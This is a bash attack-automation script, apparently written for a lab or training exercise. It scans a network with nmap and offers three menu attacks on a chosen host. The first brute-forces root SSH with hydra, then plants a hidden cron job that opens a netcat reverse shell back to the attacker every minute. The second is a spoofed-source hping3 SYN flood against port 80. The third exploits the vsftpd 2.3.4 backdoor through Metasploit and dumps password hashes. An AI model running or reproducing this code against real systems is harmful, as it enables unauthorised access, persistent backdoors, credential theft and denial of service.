#!/bin/bash

red="\033[38;5;203m"
green="\033[38;5;121m"
blue="\033[38;5;117m"
beige="\033[38;5;223m"
colour="\033[0m"

function sshpass_install()
{
	# Check if sshpass is installed for attacks to run smoothly.
	sshpass_check=$(which sshpass | wc -l)
	if [ $sshpass_check -eq 0 ]
	then
		echo -e "${red}[x]${colour} SSHPass is required. Proceeding to install..."
		sudo apt-get install -y sshpass
		echo -e "${green}[>]${colour} Installation complete."
		echo
	else
		# SSHPass is already installed.
		:
	fi
}

function network_valid()
{
	# Use regex to validate IP address with its 4 octets and CIDR
	ipregex='^([0-9]{1,3}\.){3}[0-9]{1,3}(/([0-9]|[1-2][0-9]|3[0-2]))?$'
	if [[ $network =~ $ipregex ]]; then
		echo -e "${blue}[*]${colour} Scanning..."
		echo
	else
		echo -e "${red}[x]${colour} Invalid IP Address!"
		network_input
	fi
}

function network_input()
{
	# Get from the user a network to scan
	read -p "$(echo -e "${beige}[?]${colour} Enter a network to scan: ")" network
	network_valid
}


function display_ip()
{                           
	# Display the results of host discovery
	echo -e "${blue}[*]${colour} Discovered hosts: "
	ip_list=$(sudo nmap -sn $network | grep "scan report" | tr -d '()' | awk '{print $(NF)}')
	echo "$ip_list"
	echo
}

function match_check()
{
	# Check if input matches the available IP addresses
	match_found=false
	for eachitem in $ip_list
	do
		if [[ "$TARGET" == "$eachitem" ]]; then
			match_found=true
			# Exit the loop if a match is found
			break 
		fi
	done
	# Proceed to next step if valid else request for user input again
	if [[ "$match_found" == "true" ]]; then
		echo -e "${blue}[*]${colour} Scouting the attack surface of $TARGET..."
		echo
	else
		# match_found remains 'false' hence no valid input
		read -p "$(echo -e "${red}[x]${colour} Invalid option! Enter a target IP or ${beige}[r]${colour}andomise: ")" TARGET
		target_valid
	fi
}

function target_valid()
{
	# Check if random option was selected
	if [[ "$TARGET" == "r" ]]; then
		TARGET=$(echo $ip_list | tr ' ' '\n' | sort -R | head -n 1)
		echo -e "${blue}[*]${colour} Scouting the attack surface of $TARGET..."
		echo
	else
		# Proceed to validate for IP address as input
		match_check
	fi
}

function target_choice()
{
	# Request user to identify a target to attack
	read -p "$(echo -e "${beige}[?]${colour} Enter a target IP or ${beige}[r]${colour}andomise: ")" TARGET
	target_valid
}


function target_scan()
{
	# Scan port services of the selected target and output to user
	sudo nmap $TARGET -p 21,22,80 -sV | sed -n '5,10p'
	echo
}

function bruteforce()
{
	# Download the password list for the bruteforce sequence
	echo -e "${blue}[*]${colour} Downloading ammo..."
	wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Default-Credentials/default-passwords.txt > /dev/null 2>&1
	# Output results of bruteforce into a file to store valid passwords.
	echo -e "${blue}[*]${colour} Executing bruteforce..."
	hydra -l root -P default-passwords.txt $TARGET ssh -o password.txt > /dev/null 2>&1
	password=$(cat password.txt | grep 'password:' | awk '{print $(NF)}')
	# Check if the bruteforce attempt was successful. If unsuccessful, the attack stops here.
	if [[ -z "$password" ]]; then
		echo -e "${red}[x]${colour} No valid passwords were found. Process completed."
		echo -e "${blue}[*]${colour} Goodbye!"
		exit
	else
		echo -e "${green}[>]${colour} Password obtained."
	fi
}

function create_backdoor()
{
	# Save public IP as variable
	IP=$(curl 'https://api.ipify.org?format=json' | grep -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b') > /dev/null 2>&1
	# Use the valid password to login as root via SSH
	echo -e "${blue}[*]${colour} Creating backdoor..."
	sshpass -p $password ssh -o StrictHostKeyChecking=no root@$TARGET "echo -e \"*/1 * * * * root rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP 4444 >/tmp/f #\r                                                                                                     \" >> /etc/cron.d/crontab"
	# Remotely create a netcat reverse connection cronjob that runs every minute and binds to the local machine at port 4444 using a named pipe (FIFO file).
	# Hide the cronjob from concatenate outputs using the carriage return symbol followed by as many spaces as the characters in the command to overwrite it upon execution.
	# Further obfuscate discovery by saving it in the /etc/cron.d/ directory to hide it from crontab commands.
	echo -e "${green}[>]${colour} Attack successful!"
	echo -e "${blue}[*]${colour} Set a listener on Port 4444 to establish a reverse shell. You may use ${beige}(nc -nlvp 4444)${colour}."
}

function remove_temp()
{
	# Remove temporary files
	sudo rm default-passwords.txt
	sudo rm password.txt
}

function DDoS()
{
	# Start TCP SYN flood with fragmentation to place more stress on the target and random source enabled for IP spoofing.
	echo -e "${blue}[*]${colour} Executing TCP SYN flood on target. Use ${beige}'Ctrl-C'${colour} to end the attack."
	sudo hping3 --flood -f --rand-source -p 80 -S $TARGET  > /dev/null 2>&1
	echo -e "${red}[x]${colour} Attack stopped."
}

function ftp_exploit()
{
	# Run hashdump to retrieve credentials after spawning a shell in background
	echo -e "${blue}[*]${colour} Exploiting the FTP backdoor..."
	msfconsole -q -x "
	use exploit/unix/ftp/vsftpd_234_backdoor;\
	set RHOST $TARGET;\
	exploit -z;\
	sessions -s linux/gather/hashdump;\
	exit -y" > /dev/null 2>&1
	echo -e "${green}[>]${colour} Target credentials successfully retrieved! Files stored in ${beige}'/home/$USER/.msf4/loot/'${colour} by default unless configured otherwise."
}

function select_attack()
{
	# Execute attack based on user selection and allow option to exit process
	case $choice in
		1)
			echo -e "${blue}[*]${colour} Option 1 selected."
			bruteforce
			create_backdoor
			remove_temp
			;;
		2)
			echo -e "${blue}[*]${colour} Option 2 selected."
			DDoS
			;;
		3)
			echo -e "${blue}[*]${colour} Option 3 selected."
			ftp_exploit
			;;
		r)
			echo -e "${blue}[*]${colour} Randomising..."
			choice=$(echo {1..3} | tr ' ' '\n' | sort -R | head -n 1)
			select_attack
			;;
		b)
			echo -e "${blue}[*]${colour} Returning to target selection..."
			echo "$ip_list"
			echo
			target_choice
			target_scan
			attack_options
			;;
		*)
			echo -e "${red}[x]${colour} Exiting..."
			echo -e "${blue}[*]${colour} Goodbye!"
			exit
			;;
	esac
}

function attack_options()
{
	# Display the available attack options and inform the user of the expected results
	echo "Available Attack Vectors: "
	echo "========================="
	echo
	echo "1 | Bruteforce"
	echo "Target Service: SSH | Port 22"
	echo "Description: Use a list of weak passwords to attempt login as root user via SSH by trial and error. If successful, gain persistence by creating a netcat reverse connection cronjob."
	echo
	echo "2 | Distributed Denial-of-Service (DDoS)"
	echo "Target Service: HTTP | Port 80"
	echo "Description: Flood the target's webserver with traffic in the attempt to disrupt its service and force it offline."
	echo
	echo "3 | Backdoor Command Execution"
	echo "Target Service: FTP | Port 21"
	echo "Description: Exploits the backdoor found in VSFTPD v2.3.4 to spawn a shell and retrieve password hashes."
	echo
	read -p "$(echo -e "${beige}[?]${colour} Select an attack ${beige}[1-3]${colour}, ${beige}[r]${colour}andomise, return ${beige}[b]${colour}ack to choose a different IP address, or anything else to exit: ")" choice
	select_attack
}

function check_log()
{
	# Create log file if it does not already exist
	log_exist=$(sudo find /var/log -type f -name attack.log)
	if [[ -z "$log_exist" ]]; then
		sudo touch /var/log/attack.log
		sudo chmod 666 /var/log/attack.log
	fi
}

function log_attack()
{
	
	# Save the attack into a log file.
	TIME=$(date)
	if [[ "$choice" == "1" ]]; then
		# Bruteforce attack was completed
		sudo echo "$TIME- [*] Bruteforce attack on $TARGET completed." >> /var/log/attack.log
	elif [[ "$choice" == "2" ]]; then
		# DDoS was executed
		sudo echo "$TIME- [*] DDoS attack on $TARGET completed." >> /var/log/attack.log
	elif [[ "$choice" == "3" ]]; then
		# FTP was exploited
		sudo echo "$TIME- [*] FTP backdoor exploit on $TARGET completed." >> /var/log/attack.log
	fi
	echo -e "${green}[>]${colour} This attack has been recorded in the ${beige}/var/log/attack.log${colour} log file."
}

function main()
{
	# Run script
	echo -e "${blue}[*]${colour} Greetings!"
	sshpass_install
	network_input
	display_ip
	target_choice
	target_scan
	attack_options
	check_log
	log_attack
	echo -e "${blue}[*]${colour} Goodbye!"
}

main
